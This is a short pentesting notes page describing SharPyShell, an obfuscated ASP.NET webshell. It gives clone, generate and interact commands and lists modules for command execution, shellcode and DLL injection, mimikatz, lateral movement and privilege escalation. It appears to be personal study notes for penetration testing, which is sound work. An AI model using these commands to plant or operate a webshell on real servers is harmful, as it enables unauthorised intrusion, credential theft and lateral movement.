---
title: SharPyShell
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - pentesting
  - terminal
  - shells
---
# SharPyShell

SharPyShell is a tiny and obfuscated ASP.NET webshell that executes commands received by an encrypted channel compiling them in memory at runtime.

SharPyShell supports only C# web applications that runs on .NET Framework >= 2.0 

VB is not supported atm.

## Install

Repo: [https://github.com/antonioCoco/SharPyShell](https://github.com/antonioCoco/SharPyShell)


```bash
git clone https://github.com/antonioCoco/SharPyShell.git
```


## Basic use


```bash
# Generate the file with a password
python3 SharPyShell.py generate -p somepassword

# Initiate a connection
python3 SharPyShell.py interact -u http://target.url/sharpyshell.aspx -p somepassword

```

 
**Modules**


```text
 #download               Download a file from the server                                            
 #exec_cmd               Run a cmd.exe /c command on the server                                     
 #exec_ps                Run a powershell.exe -nop -noni -enc 'base64command' on the server         
 #inject_dll_reflective  Inject a reflective DLL in a new (or existing) process                     
 #inject_dll_srdi        Inject a generic DLL in a new (or existing) process                        
 #inject_shellcode       Inject shellcode in a new (or existing) process                            
 #invoke_ps_module       Run a ps1 script on the target server                                      
 #invoke_ps_module_as    Run a ps1 script on the target server as a specific user                   
 #lateral_psexec         Run psexec binary to move laterally                                        
 #lateral_wmi            Run builtin WMI command to move laterally                                  
 #mimikatz               Run an offline version of mimikatz directly in memory                      
 #net_portscan           Run a port scan using regular sockets, based (pretty) loosely on nmap      
 #privesc_juicy_potato   Launch InMem Juicy Potato attack trying to impersonate NT AUTHORITY\SYSTEM 
 #privesc_powerup        Run Powerup module to assess all misconfiguration for privesc              
 #runas                  Run a cmd.exe /c command spawning a new process as a specific user         
 #runas_ps               Run a powershell.exe -enc spawning a new process as a specific user        
 #upload                 Upload a file to the server
 ```
 